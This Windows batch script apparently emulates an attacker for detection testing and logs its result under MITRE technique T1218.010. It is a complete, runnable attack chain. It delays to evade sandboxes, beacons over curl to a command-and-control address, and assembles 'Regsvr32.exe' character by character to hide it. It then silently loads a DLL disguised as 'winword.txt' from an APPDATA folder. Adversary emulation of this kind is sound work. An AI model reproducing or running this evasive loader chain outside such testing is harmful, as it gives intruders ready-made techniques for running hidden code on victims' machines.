@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8470\c294b668
SET fpakbq=Macula-Stage0-8470
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8470-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=winword.txt
SET fpldhe=8470

REM Log file variable
SET logfile=%APPDATA%\!yydue!\macula-simulations.log
SET tmpdir=%APPDATA%\!yydue!

REM Create log directory if it doesn't exist
IF NOT EXIST "!tmpdir!" MD "!tmpdir!" >nul 2>nul

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_start=executing>> "!logfile!" 2>nul

REM Initial delay to evade sandbox (30-60 seconds)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_start=45_seconds>> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_end=complete>> "!logfile!" 2>nul

REM C2 Heartbeat using curl
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_start=connecting>> "!logfile!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_end=complete>> "!logfile!" 2>nul

REM Delay between operations
ping -n 8 127.0.0.1 >nul

REM Obfuscate Regsvr32.exe using character-by-character assembly
SET a1=R
SET a2=e
SET a3=g
SET a4=s
SET a5=v
SET a6=r
SET a7=3
SET a8=2
SET ex1=.
SET ex2=e
SET ex3=x
SET ex4=e

REM Assemble the executable name
SET lolbin=!a1!!a2!!a3!!a4!!a5!!a6!!a7!!a8!!ex1!!ex2!!ex3!!ex4!

REM Obfuscate arguments using character codes
SET slash=/
SET s_char=s

REM Build the command
SET arg1=!slash!!s_char!
SET fullcmd=!lolbin! !arg1!

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: command_assembly=complete>> "!logfile!" 2>nul

REM Random delay
SET /A rdelay=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start=!rdelay!_seconds>> "!logfile!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_end=complete>> "!logfile!" 2>nul

REM Change to output directory
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!logfile!" 2>nul
CD /D "!yktnwwf!" >nul 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_end=!errorlevel!>> "!logfile!" 2>nul

REM Delay before execution
CHOICE /C Y /N /D Y /T 7 >nul

REM Execute Regsvr32 with the DLL
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_load_start=!edjwtl!>> "!logfile!" 2>nul
!fullcmd! "!edjwtl!"
SET ttp_result=!errorlevel!
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_load_end=!ttp_result!>> "!logfile!" 2>nul

REM TTP logging
SET ttp_result_val=0
SET err_detail=
IF !ttp_result! EQU 0 (
    SET ttp_result_val=1
) ELSE (
    SET err_detail=!ttp_result!
)

REM Format timestamp
SET logdate=%DATE:~-4,4%-%DATE:~-10,2%-%DATE:~-7,2%
SET logtime=%TIME: =0%
SET logtime=!logtime:~0,2!:!logtime:~3,2!:!logtime:~6,5!

echo [!logdate! !logtime!][!omxgazu!]: !yydue!-!fpldhe!-T1218.010|Regsvr32=!ttp_result_val!:!err_detail!>> "!logfile!" 2>nul

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_end=complete>> "!logfile!" 2>nul

REM Final delay
timeout /t 12 /nobreak >nul

ENDLOCAL